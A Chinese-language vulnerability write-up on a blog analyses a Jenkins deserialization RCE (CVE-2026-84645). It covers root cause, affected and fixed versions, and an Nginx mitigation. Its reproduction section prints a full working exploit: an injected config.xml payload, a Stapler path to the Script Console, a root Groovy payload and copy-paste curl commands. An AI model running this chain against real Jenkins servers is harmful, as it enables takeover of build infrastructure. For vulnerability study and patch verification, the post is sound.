@@ -1,0 +1,329 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。"><meta name="theme-color" content="#f5f2eb"><title>Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645） — hongzh0's Blog</title>
+<link rel="canonical" href="https://hongzh0.wiki/posts/jenkins-persistenceroot-deserialization-rce.html"><link rel="alternate" type="application/rss+xml" title="hongzh0's Blog RSS" href="/feed.xml"><link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+<meta property="og:type" content="article"><meta property="og:locale" content="zh_CN"><meta property="og:site_name" content="hongzh0's Blog"><meta property="og:title" content="Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645）"><meta property="og:description" content="分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。"><meta property="og:url" content="https://hongzh0.wiki/posts/jenkins-persistenceroot-deserialization-rce.html"><meta property="og:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta property="og:image:alt" content="hongzh0 的个人照片"><meta property="og:image:width" content="960"><meta property="og:image:height" content="960"><meta property="article:published_time" content="2026-09-06T06:24:53.000Z">
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645）"><meta name="twitter:description" content="分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。"><meta name="twitter:image" content="https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg"><meta name="twitter:image:alt" content="hongzh0 的个人照片">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645）","description":"分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。","image":"https://hongzh0.wiki/assets/portrait-c47a226a5fdc9058ab5ee435ce6f0352.jpg","datePublished":"2026-09-06T06:24:53.000Z","dateModified":"2026-09-06T06:24:53.000Z","inLanguage":"zh-CN","mainEntityOfPage":"https://hongzh0.wiki/posts/jenkins-persistenceroot-deserialization-rce.html","url":"https://hongzh0.wiki/posts/jenkins-persistenceroot-deserialization-rce.html","author":{"@type":"Person","name":"hongzh0","url":"https://hongzh0.wiki/about.html"},"publisher":{"@type":"Person","name":"hongzh0"}}</script><link rel="stylesheet" href="/assets/fonts/font-face.css?v=7540f2c171e5"><link rel="stylesheet" href="../assets/style.css?v=7540f2c171e5"><script>try{const saved=localStorage.getItem('theme');const theme=saved==='dark'||saved==='light'?saved:(matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light');const color=theme==='dark'?'#1b1d19':'#f5f2eb';document.documentElement.dataset.theme=theme;document.documentElement.style.colorScheme=theme;document.querySelector('meta[name="theme-color"]')?.setAttribute('content',color)}catch{document.documentElement.dataset.theme='light';document.documentElement.style.colorScheme='light'}</script></head><body>
+<div class="reading-progress" aria-hidden="true"><span></span></div><a class="skip-link" href="#article">跳到正文</a><header class="site-header"><a class="brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><button type="button" class="menu-toggle" aria-label="打开导航" aria-controls="site-navigation" aria-expanded="false"><span aria-hidden="true"></span><span aria-hidden="true"></span></button><nav class="site-nav" id="site-navigation" aria-label="主导航"><a href="../index.html">首页</a><a href="../archive.html">归档</a><a href="../links.html">友链</a><a href="../about.html">关于</a><button type="button" class="theme-toggle" aria-label="切换深浅色主题" aria-pressed="false"><span class="sun" aria-hidden="true">☼</span><span class="moon" aria-hidden="true">◐</span></button></nav></header>
+<main id="main"><section class="article-hero wrap"><header class="article-header"><a class="article-breadcrumb" href="../archive.html"><span aria-hidden="true">←</span> 文章归档 / 漏洞分析</a><div class="post-meta"><span>漏洞分析</span><time datetime="2026-09-06T06:24:53.000Z">2026.09.06</time><span>24 分钟阅读</span><span class="post-badge">定风波Agent复现</span></div><h1>Jenkins 嵌套 PersistenceRoot 反序列化远程代码执行漏洞（CVE-2026-84645）</h1><p class="article-lead">分析 Jenkins core XStream 反序列化器未阻止 PersistenceRoot 对象作为嵌套字段注入的根因，实测提交作业 config.xml 构造 FingerprintAction→FreeStyleBuild→FreeStyleProject→Hudson 注入链，经 Stapler 路由到达未受保护的 Script Console 以 root 执行任意 Groovy，并验证 2.580 守卫修复与 Nginx 拦截缓解。</p><dl class="article-facts"><div><dt>PUBLISHED</dt><dd>2026.09.06</dd></div><div><dt>READING</dt><dd>24 MIN</dd></div><div><dt>SECTIONS</dt><dd>08</dd></div><div><dt>VIEWS</dt><dd id="busuanzi_page_pv">—</dd></div></dl></header>
+<div class="featured-visual article-cover"><span class="visual-grid" aria-hidden="true"></span><span class="visual-orbit orbit-one" aria-hidden="true"></span><span class="visual-orbit orbit-two" aria-hidden="true"></span><span class="visual-center" data-cover-length="7" aria-hidden="true">Jenkins</span><span class="visual-caption" aria-hidden="true">SECURITY RESEARCH · 2026-09-06</span></div></section>
+<details class="mobile-toc wrap"><summary><span>文章目录</span><small>08 SECTIONS</small></summary><nav aria-label="移动端文章目录"><a href="#section-漏洞简介-1">漏洞简介</a><a class="toc-h3" href="#section-triage-评分-2">Triage 评分</a><a class="toc-h3" href="#section-信息可信度说明-3">信息可信度说明</a><a href="#section-漏洞描述-4">漏洞描述</a><a href="#section-影响版本与利用条件-5">影响版本与利用条件</a><a href="#section-环境搭建-6">环境搭建</a><a href="#section-漏洞复现-实测-2026-09-04-7">漏洞复现（实测，2026-09-04）</a><a class="toc-h3" href="#section-step-1-建立载体-job-8">STEP 1 — 建立载体 job</a><a class="toc-h3" href="#section-step-2-attacker-提交注入-config-xml-核心攻击请求-9">STEP 2 — attacker 提交注入 config.xml（核心攻击请求）</a><a class="toc-h3" href="#section-step-3-stapler-逐段导航到注入的-script-console-10">STEP 3 — Stapler 逐段导航到注入的 Script Console</a><a class="toc-h3" href="#section-step-4-提交-groovy-执行任意代码-rce-验收-11">STEP 4 — 提交 Groovy 执行任意代码（RCE 验收）</a><a class="toc-h3" href="#section-step-over-修复版对照矩阵-全部实测-12">STEP Over — 修复版对照矩阵（全部实测）</a><a class="toc-h3" href="#section-可独立复现的-curl-命令-三段式-13">可独立复现的 curl 命令（三段式）</a><a href="#section-漏洞分析-14">漏洞分析</a><a class="toc-h3" href="#section-攻击原理-15">攻击原理</a><a href="#section-修复建议-16">修复建议</a><a class="toc-h3" href="#section-官方修复-17">官方修复</a><a class="toc-h3" href="#section-临时缓解-18">临时缓解</a><a href="#section-参考链接-19">参考链接</a></nav></details><div class="article-layout" id="article"><aside class="article-toc" aria-label="文章目录"><div class="article-toc-head"><span>CONTENTS</span><small>08 SECTIONS</small></div><nav class="article-toc-nav"><a href="#section-漏洞简介-1">漏洞简介</a><a class="toc-h3" href="#section-triage-评分-2">Triage 评分</a><a class="toc-h3" href="#section-信息可信度说明-3">信息可信度说明</a><a href="#section-漏洞描述-4">漏洞描述</a><a href="#section-影响版本与利用条件-5">影响版本与利用条件</a><a href="#section-环境搭建-6">环境搭建</a><a href="#section-漏洞复现-实测-2026-09-04-7">漏洞复现（实测，2026-09-04）</a><a class="toc-h3" href="#section-step-1-建立载体-job-8">STEP 1 — 建立载体 job</a><a class="toc-h3" href="#section-step-2-attacker-提交注入-config-xml-核心攻击请求-9">STEP 2 — attacker 提交注入 config.xml（核心攻击请求）</a><a class="toc-h3" href="#section-step-3-stapler-逐段导航到注入的-script-console-10">STEP 3 — Stapler 逐段导航到注入的 Script Console</a><a class="toc-h3" href="#section-step-4-提交-groovy-执行任意代码-rce-验收-11">STEP 4 — 提交 Groovy 执行任意代码（RCE 验收）</a><a class="toc-h3" href="#section-step-over-修复版对照矩阵-全部实测-12">STEP Over — 修复版对照矩阵（全部实测）</a><a class="toc-h3" href="#section-可独立复现的-curl-命令-三段式-13">可独立复现的 curl 命令（三段式）</a><a href="#section-漏洞分析-14">漏洞分析</a><a class="toc-h3" href="#section-攻击原理-15">攻击原理</a><a href="#section-修复建议-16">修复建议</a><a class="toc-h3" href="#section-官方修复-17">官方修复</a><a class="toc-h3" href="#section-临时缓解-18">临时缓解</a><a href="#section-参考链接-19">参考链接</a></nav></aside><article class="article-content"><blockquote>
+<p><strong>实验说明：</strong> 本文全部 PoC 与攻击流量均在授权隔离靶场（自建 Jenkins Docker 环境）中完成实测，仅用于漏洞研究与修复验证。请勿对未授权目标实施类似测试。</p>
+</blockquote>
+<blockquote>
+<p>CVE-2026-84645 / SECURITY-3972 · Jenkins core · CVSS 3.1 8.8（HIGH）· 已实测完整 RCE 链</p>
+</blockquote>
+<h2 id="section-漏洞简介-1">漏洞简介</h2>
+<ul>
+<li><strong>CVE 编号</strong>：CVE-2026-84645</li>
+<li><strong>厂商内部编号</strong>：SECURITY-3972</li>
+<li><strong>产品</strong>：Jenkins core（开源 CI/CD 服务器，Java）</li>
+<li><strong>漏洞类型</strong>：反序列化导致远程代码执行（CWE-94 Improper Control of Generation of Code / CWE-915 Improperly Controlled Modification of Dynamically-Determined Object Attributes）</li>
+<li><strong>Disclosure Date</strong>：2026-09-02（Jenkins 官方公告发布日；CVE 保留于 2026-09-01，CNA 记录 2026-09-02 发布）</li>
+<li><strong>报告渠道</strong>：Jenkins Bug Bounty Program（欧盟委员会赞助）[来源：官方公告]</li>
+</ul>
+<h3 id="section-triage-评分-2">Triage 评分</h3>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>分值</th>
+<th>依据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>危害分</td>
+<td>8.8/10</td>
+<td>NVD 记录 CVSS 3.1 Secondary（CISA ADP Vulnrichment）：<code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code>（<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-84645">NVD 详情</a>，NVD 状态 Undergoing Analysis，无 Primary 分，取 Secondary 8.8）</td>
+</tr>
+<tr>
+<td>可信度分</td>
+<td>8.9/10</td>
+<td>信息可信度说明表：已确认 8 条 / 共 9 条 × 10</td>
+</tr>
+<tr>
+<td>实测分</td>
+<td>10/10</td>
+<td>真实环境实测（Jenkins 2.579 官方 war + Docker）完整 RCE：注入 → Stapler 路由 → Script Console → root 身份执行 Groovy + 落地文件；Phase 3c 反自欺六项取证通过（<code>D:\X\CVE-2026-84645_verify.md</code>）</td>
+</tr>
+<tr>
+<td><strong>综合</strong></td>
+<td><strong>9.1/10</strong></td>
+<td>0.5×8.8 + 0.3×8.9 + 0.2×10 = 9.07 ≈ 9.1</td>
+</tr>
+</tbody></table>
+<h3 id="section-信息可信度说明-3">信息可信度说明</h3>
+<table>
+<thead>
+<tr>
+<th>可信度</th>
+<th>内容</th>
+<th>依据</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>已确认</td>
+<td>漏洞存在与根因（嵌套 PersistenceRoot 反序列化 + Stapler 路由 → RCE）</td>
+<td>NVD 描述 + CVE.org CNA 记录 + 官方公告 SECURITY-3972 三源一致</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>受影响版本：weekly ≤2.579、LTS ≤2.568.2</td>
+<td>NVD CPE（2.580/2.568.3 unaffected，defaultStatus affected）+ CNA + 官方公告三源一致</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>修复版本：2.580（weekly）、2.568.3（LTS），2026-09-02 发布</td>
+<td>官方公告 + jenkins.io changelog（2.580 条目：2026-09-02 &quot;Security Important security fixes&quot;）</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>CVSS 8.8 与向量</td>
+<td>NVD 记录内 CISA ADP Vulnrichment metrics + GHSA cvss_v3 一致</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>CWE-94 / CWE-915</td>
+<td>NVD weaknesses + CVE.org ADP problemTypes</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>修复 commit <code>0d731367e08656f8cd1e8275f0e820f97af07fc6</code>（8 文件 +190/-6）</td>
+<td>GitHub commit API 检索 <code>[SECURITY-3972]</code> 唯一命中 + 文件列表实读</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>守卫逻辑：<code>RobustReflectionConverter</code> 拒绝嵌套 PersistenceRoot 字段反序列化，三种安全模式（reference= 回引 / resolves-to Replacer / SingleValueConverter），异常消息 &quot;Refusing to unmarshal PersistenceRoot subtype ...&quot;</td>
+<td>patch diff 实读（commit 0d73136）+ 2.580 靶场实测日志逐字命中</td>
+</tr>
+<tr>
+<td>已确认</td>
+<td>完整 RCE 链：<code>FingerprintAction</code>（transient <code>Run build</code>）→ <code>FreeStyleBuild</code>（transient <code>Job project</code>）→ <code>FreeStyleProject</code>（transient <code>ItemGroup parent</code>）→ <code>Hudson</code>（注入 <code>authorizationStrategy</code>），URL <code>/job/&lt;name&gt;/fingerprints/run/parent/parent/script</code> 到达未受保护 Script Console，attacker 以 root 执行任意 Groovy</td>
+<td>本报告 Phase 3b 实测：2.579 注入 200 + <code>/script</code> 200 + scriptText 返回 <code>RCE_MARKER_84645_root</code> + <code>/tmp/rce-proof-84645</code> 落地；2.580 同链 404 无执行无副作用（见后文行为矩阵）</td>
+</tr>
+<tr>
+<td>未知</td>
+<td>原始 Bug Bounty 报告者的具体构造（本报告 RCE 链为独立复现，与报告者构造是否一致未知）；公开 PoC/媒体覆盖</td>
+<td>[NOT FOUND: 搜索了 NVD references、GitHub Advisory、Google News RSS×2、DuckDuckGo——发布仅 2 天无公开 PoC/报道]</td>
+</tr>
+</tbody></table>
+<h2 id="section-漏洞描述-4">漏洞描述</h2>
+<p>Jenkins 是使用最广泛的开源自动化服务器，用于构建、测试和部署软件。它通过 Java 的 XStream 库对各类配置文件（如作业的 <code>config.xml</code>）进行序列化与反序列化，并使用 Stapler Web 框架基于反射命名约定将 HTTP 请求路由到内存对象图。</p>
+<p>由于 Jenkins 的 XStream 反序列化器在处理用户提交的 <code>config.xml</code> 文档时，未阻止将标记为把配置存储在独立顶级配置文件中的对象类型（实现 <code>PersistenceRoot</code> 接口，如作业、构建、代理乃至 Jenkins 根配置对象）作为其他对象的嵌套字段值反序列化，持相应权限（提交 job config.xml 需 Item/Configure，结合官方 CVSS 向量 PR:L 推断为 Overall/Read + Item/Configure）的攻击者可通过向作业的 <code>config.xml</code> 端点提交特制 XML，把此类对象注入 Jenkins 内存对象图。被注入的对象随后经 Stapler 的反射式请求路由处理 HTTP 请求（实测：注入对象的 URL 页面返回 200）。攻击者组合多个此类对象可构造到达未妥善保护的 Script Console 的 URL 路径——注入的 Jenkins 实例用攻击者在 XML 中自带指定的授权策略做权限检查，绕过真实系统的授权配置——最终以运行 Jenkins 的操作系统用户身份执行任意 Groovy 代码，造成远程代码执行（实测以 root 身份执行成功）。修复后的 Jenkins 2.580 与 LTS 2.568.3 阻止此类类型作为其他对象的嵌套字段值被反序列化。</p>
+<h2 id="section-影响版本与利用条件-5">影响版本与利用条件</h2>
+<p><strong>受影响版本</strong>：</p>
+<ul>
+<li>weekly：<code>2.579 及更早</code>（2.580 起不受影响）</li>
+<li>LTS：<code>2.568.2 及更早</code>（2.568.3 起不受影响）</li>
+</ul>
+<p><strong>利用条件</strong>：攻击者需为 Jenkins 登录用户并持有对至少一个 job 的 Item/Configure 权限（可提交该 job 的 <code>config.xml</code>），无需管理员权限。</p>
+<h2 id="section-环境搭建-6">环境搭建</h2>
+<ul>
+<li>目标：Jenkins <strong>2.579</strong>（受影响版）+ 对照组 Jenkins <strong>2.580</strong>（修复版）</li>
+<li>环境：CentOS 7 Docker 宿主机（10.10.10.10），<code>maven:3.9.6-eclipse-temurin-17</code> 镜像 + 外挂 JDK21 运行官方 war（war 来自 get.jenkins.io 官方直链经清华镜像，字节数 53,725,839 / 53,729,873 与官方 HEAD 一致）</li>
+<li>靶场配置：Jenkins 自建用户数据库，attacker 为普通登录用户（提交 config.xml 的权限与官方 CVSS PR:L 语义对应）；2.579 与 2.580 配置完全相同</li>
+<li>攻击者账户：<code>attacker / attacker123</code>（非管理员）</li>
+</ul>
+<h2 id="section-漏洞复现-实测-2026-09-04-7">漏洞复现（实测，2026-09-04）</h2>
+<h3 id="section-step-1-建立载体-job-8">STEP 1 — 建立载体 job</h3>
+<p>以 admin 登录创建普通 FreeStyle job <code>carrier</code>（POST <code>/createItem?name=carrier</code>，标准 config.xml，HTTP 200）。attacker 拥有对该 job 的 Item/Configure 权限即可，无需管理员。</p>
+<h3 id="section-step-2-attacker-提交注入-config-xml-核心攻击请求-9">STEP 2 — attacker 提交注入 config.xml（核心攻击请求）</h3>
+<pre><code class="language-http">POST /job/carrier/config.xml HTTP/1.1
+Host: 127.0.0.1:8057
+Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
+Content-Type: application/xml
+Jenkins-Crumb: &lt;attacker 会话 crumb&gt;
+
+&lt;?xml version=&quot;1.1&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project&gt;
+  &lt;actions&gt;
+    &lt;hudson.tasks.Fingerprinter_-FingerprintAction&gt;
+      &lt;build class=&quot;hudson.model.FreeStyleBuild&quot;&gt;
+        &lt;queueId&gt;0&lt;/queueId&gt;&lt;timestamp&gt;0&lt;/timestamp&gt;&lt;startTime&gt;0&lt;/startTime&gt;
+        &lt;duration&gt;0&lt;/duration&gt;&lt;charset&gt;UTF-8&lt;/charset&gt;&lt;keepLog&gt;false&lt;/keepLog&gt;&lt;built&gt;false&lt;/built&gt;
+        &lt;project class=&quot;hudson.model.FreeStyleProject&quot;&gt;
+          &lt;actions/&gt;
+          &lt;description&gt;pwned&lt;/description&gt;
+          &lt;keepDependencies&gt;false&lt;/keepDependencies&gt;
+          &lt;properties/&gt;
+          &lt;scm class=&quot;hudson.scm.NullSCM&quot;/&gt;
+          &lt;canRoam&gt;true&lt;/canRoam&gt;
+          &lt;disabled&gt;false&lt;/disabled&gt;
+          &lt;blockBuildWhenDownstreamBuilding&gt;false&lt;/blockBuildWhenDownstreamBuilding&gt;
+          &lt;blockBuildWhenUpstreamBuilding&gt;false&lt;/blockBuildWhenUpstreamBuilding&gt;
+          &lt;triggers/&gt;
+          &lt;concurrentBuild&gt;false&lt;/concurrentBuild&gt;
+          &lt;builders/&gt;
+          &lt;publishers/&gt;
+          &lt;buildWrappers/&gt;
+          &lt;parent class=&quot;hudson.model.Hudson&quot;&gt;
+            &lt;authorizationStrategy class=&quot;hudson.security.FullControlOnceLoggedInAuthorizationStrategy&quot;/&gt;
+          &lt;/parent&gt;
+        &lt;/project&gt;
+      &lt;/build&gt;
+    &lt;/hudson.tasks.Fingerprinter_-FingerprintAction&gt;
+  &lt;/actions&gt;
+  &lt;description&gt;carrier&lt;/description&gt;
+  &lt;keepDependencies&gt;false&lt;/keepDependencies&gt;
+  &lt;properties/&gt;
+  &lt;scm class=&quot;hudson.scm.NullSCM&quot;/&gt;
+  &lt;canRoam&gt;true&lt;/canRoam&gt;
+  &lt;disabled&gt;false&lt;/disabled&gt;
+  &lt;triggers/&gt;
+  &lt;concurrentBuild&gt;false&lt;/concurrentBuild&gt;
+  &lt;builders/&gt;
+  &lt;publishers/&gt;
+  &lt;buildWrappers/&gt;
+&lt;/project&gt;
+</code></pre>
+<p><strong>实测响应（2.579）</strong>：<code>HTTP/1.1 200</code>——反序列化成功，嵌套对象图进入内存（<code>FingerprintAction.build</code> 为 transient，不落盘，存活于内存对象图）。</p>
+<h3 id="section-step-3-stapler-逐段导航到注入的-script-console-10">STEP 3 — Stapler 逐段导航到注入的 Script Console</h3>
+<pre><code class="language-http">GET /job/carrier/fingerprints/run/parent/parent/script HTTP/1.1
+Host: 127.0.0.1:8057
+Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
+</code></pre>
+<p><strong>实测响应（2.579）</strong>：<code>HTTP/1.1 200</code>（88,387 字节，Jenkins Script Console 页面）。逐段实测：<code>fingerprints/</code> → 200（注入的 FingerprintAction 页面）、<code>fingerprints/run/</code> → 200（注入的 FreeStyleBuild 页面）、<code>fingerprints/run/parent/</code> → 200（注入的 FreeStyleProject 页面，描述显示 pwned）、<code>.../parent/parent/script</code> → 200（注入的 Hudson 实例上的 Script Console）。</p>
+<h3 id="section-step-4-提交-groovy-执行任意代码-rce-验收-11">STEP 4 — 提交 Groovy 执行任意代码（RCE 验收）</h3>
+<pre><code class="language-http">POST /job/carrier/fingerprints/run/parent/parent/scriptText HTTP/1.1
+Host: 127.0.0.1:8057
+Authorization: Basic YXR0YWNrZXI6YXR0YWNrZXIxMjM=
+Content-Type: application/x-www-form-urlencoded
+Jenkins-Crumb: &lt;attacker 会话 crumb&gt;
+Cookie: JSESSIONID.3dadf1ed=node0dnyhdfbaajem1q30rqe4hutms1.node0
+Content-Length: 85
+
+script=println+&quot;RCE_MARKER_84645_&quot;+System.getProperty(&quot;user.name&quot;)...（实测提交的 Groovy，见下）
+</code></pre>
+<p>实际提交的 Groovy（form-encoded 前的原文）：</p>
+<pre><code class="language-groovy">println &quot;RCE_MARKER_84645_&quot; + System.getProperty(&quot;user.name&quot;) + &quot;_&quot; + new Date().toString(); new File(&quot;/tmp/rce-proof-84645&quot;).text = &quot;pwned-by-cve-2026-84645 at &quot; + new Date()
+</code></pre>
+<p><strong>实测响应（2.579，真实流量）</strong>：</p>
+<pre><code class="language-text">RCE_MARKER_84645_root_Fri Sep 04 03:13:57 UTC 2026
+Result: pwned-by-cve-2026-84645 at Fri Sep 04 03:13:57 UTC 2026
+</code></pre>
+<p><strong>独立副作用验证</strong>（docker exec 容器内查看，证明代码运行在 Jenkins JVM 进程内）：</p>
+<pre><code class="language-bash"># docker exec j579 cat /tmp/rce-proof-84645
+pwned-by-cve-2026-84645 at Fri Sep 04 03:13:57 UTC 2026
+</code></pre>
+<p>Jenkins 进程以容器 root 用户运行（ps 确认 PID 1 为 <code>java -jar jenkins-2.579.war</code>），故 Groovy 以 root 身份执行。四验收齐备：真二进制（官方 war）、真代码路径（Stapler 路由链全 200）、真进程执行（JVM 内 <code>System.getProperty(&quot;user.name&quot;)</code> 返回 root）、真副作用（容器内文件落地）。</p>
+<h3 id="section-step-over-修复版对照矩阵-全部实测-12">STEP Over — 修复版对照矩阵（全部实测）</h3>
+<table>
+<thead>
+<tr>
+<th>行为</th>
+<th>Jenkins 2.579（受影响）</th>
+<th>Jenkins 2.580（修复）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>提交注入 config.xml</td>
+<td>200，对象图注入成功</td>
+<td>200，但 transient 字段被静默忽略（同公告 SECURITY-4032 修复行为），注入失败</td>
+</tr>
+<tr>
+<td>用非 transient 持久字段（<code>PermalinkEntryAction.build</code>）注入</td>
+<td>200 且持久化（readback 含注入对象）</td>
+<td><strong>500 + 日志 <code>Refusing to unmarshal PersistenceRoot subtype &#39;hudson.model.FreeStyleBuild&#39; into field &#39;build&#39; in &#39;jenkins.model.job.PermalinksAction$PermalinkEntryAction&#39;</code>，config.xml 未被污染</strong></td>
+</tr>
+<tr>
+<td><code>GET .../parent/parent/script</code></td>
+<td>200（Script Console 页面）</td>
+<td>404（注入链不存在）</td>
+</tr>
+<tr>
+<td><code>POST .../scriptText</code> 执行 Groovy</td>
+<td>200，<code>RCE_MARKER_84645_root</code> + 文件落地</td>
+<td>404，无执行</td>
+</tr>
+<tr>
+<td><code>/tmp/rce-proof-84645</code> 副作用</td>
+<td>存在</td>
+<td>不存在</td>
+</tr>
+</tbody></table>
+<h3 id="section-可独立复现的-curl-命令-三段式-13">可独立复现的 curl 命令（三段式）</h3>
+<pre><code class="language-bash"># [阶段1] 获取会话与 crumb（attacker 为任意可提交 config.xml 的普通用户）
+curl -s -u attacker:attacker123 -c /tmp/cj.txt http://127.0.0.1:8057/crumbIssuer/api/json
+#   → {&quot;_class&quot;:&quot;hudson.security.csrf.DefaultCrumbIssuer&quot;,&quot;crumb&quot;:&quot;&lt;CRUMB&gt;&quot;,...}
+
+# [阶段2] 提交注入 payload（car11.xml 内容见 STEP 2）
+curl -s -u attacker:attacker123 -b /tmp/cj.txt \
+  -H &quot;Jenkins-Crumb: &lt;CRUMB&gt;&quot; -X POST -H &#39;Content-Type: application/xml&#39; \
+  --data-binary @car11.xml http://127.0.0.1:8057/job/carrier/config.xml
+#   → 200
+
+# [阶段3] 验证 RCE（marker 输出 + 文件副作用）
+curl -s -u attacker:attacker123 -b /tmp/cj.txt -H &quot;Jenkins-Crumb: &lt;CRUMB&gt;&quot; \
+  -X POST http://127.0.0.1:8057/job/carrier/fingerprints/run/parent/parent/scriptText \
+  --data-urlencode &#39;script=println &quot;RCE_MARKER_&quot; + System.getProperty(&quot;user.name&quot;); new File(&quot;/tmp/rce-proof&quot;).text = &quot;pwned&quot;&#39;
+#   → RCE_MARKER_root（Jenkins 以 root 运行时）
+</code></pre>
+<h2 id="section-漏洞分析-14">漏洞分析</h2>
+<h3 id="section-攻击原理-15">攻击原理</h3>
+<p>config.xml 中把实现 <code>PersistenceRoot</code> 接口的对象作为嵌套字段值注入。利用链（每层均来自 <code>jenkins-core-2.579.jar</code> 内真实类，无任何自定义类）：</p>
+<p><code>hudson.tasks.Fingerprinter$FingerprintAction</code>（transient <code>Run build</code> 字段）→ <code>hudson.model.FreeStyleBuild</code>（transient <code>Job project</code> 字段）→ <code>hudson.model.FreeStyleProject</code>（transient <code>ItemGroup parent</code> 字段）→ <code>hudson.model.Hudson</code>（注入非 transient <code>authorizationStrategy</code> 字段为 <code>FullControlOnceLoggedInAuthorizationStrategy</code>）。</p>
+<p>注入后 Stapler 逐 getter 导航（<code>getDynamic</code> → <code>getUrlName</code>=&quot;fingerprints&quot; → <code>getRun()</code> → <code>getParent()</code> → <code>getParent()</code>），到达注入的 Hudson 实例；其 <code>getTarget()</code>（StaplerProxy）的权限检查使用注入实例自带的 <code>authorizationStrategy</code>（攻击者在 XML 中指定）而非真实系统配置——即公告所称&quot;未妥善保护的 Script Console&quot;。</p>
+<h2 id="section-修复建议-16">修复建议</h2>
+<h3 id="section-官方修复-17">官方修复</h3>
+<p>升级到 Jenkins <strong>2.580</strong>（weekly）或 <strong>LTS 2.568.3</strong>。修复 commit 在 <code>RobustReflectionConverter.doUnmarshal</code> 中新增守卫：字段类型为 <code>PersistenceRoot</code> 子类型时，仅当满足三种安全模式（XStream <code>reference=</code> 反向引用、<code>resolves-to</code> 指向非 PersistenceRoot 的 Replacer 占位类型、或该类型注册了 SingleValueConverter）才允许反序列化，否则抛出 <code>CriticalXStreamException</code> 拒绝整个文档；同时 <code>Jenkins.readResolve()</code> 拒绝在单例已存在时反序列化第二个 Jenkins 实例。</p>
+<p><strong>升级命令</strong>：</p>
+<pre><code class="language-bash"># weekly 用户：下载 2.580 war 替换旧 war 后重启 Jenkins 进程
+wget https://get.jenkins.io/war/2.580/jenkins.war -O jenkins.war
+# LTS 用户：
+wget https://get.jenkins.io/war-stable/2.568.3/jenkins.war -O jenkins.war
+# 替换 war 后重启 Jenkins 进程（systemctl restart jenkins 或重启容器）
+# Docker 用户：参考官方镜像 tag 页选择对应版本 https://hub.docker.com/r/jenkins/jenkins/tags
+# （注：具体 tag 存在性本环境未验证，以 tag 页为准；war 直链已逐一 HEAD 验证）
+</code></pre>
+<h3 id="section-临时缓解-18">临时缓解</h3>
+<p>以下缓解不替代升级，均为升级前的临时措施：</p>
+<ol>
+<li><p><strong>反向代理拦截非授信源对 config.xml 的写操作</strong>（Nginx 示例，仅允许管理网段 POST，其余 403）：</p>
+<pre><code class="language-nginx">location ~ ^/job/[^/]+/config\.xml$ {
+    limit_except GET {
+        allow 10.0.0.0/8;   # 管理网段
+        deny all;
+    }
+    proxy_pass http://jenkins_upstream;
+}
+</code></pre>
+<p>实测依据：本漏洞攻击入口即 <code>POST /job/&lt;name&gt;/config.xml</code>（STEP 2），拦截该写操作即切断注入入口；但对其他接受用户 XML 的端点（view、agent 配置）应同法覆盖。</p>
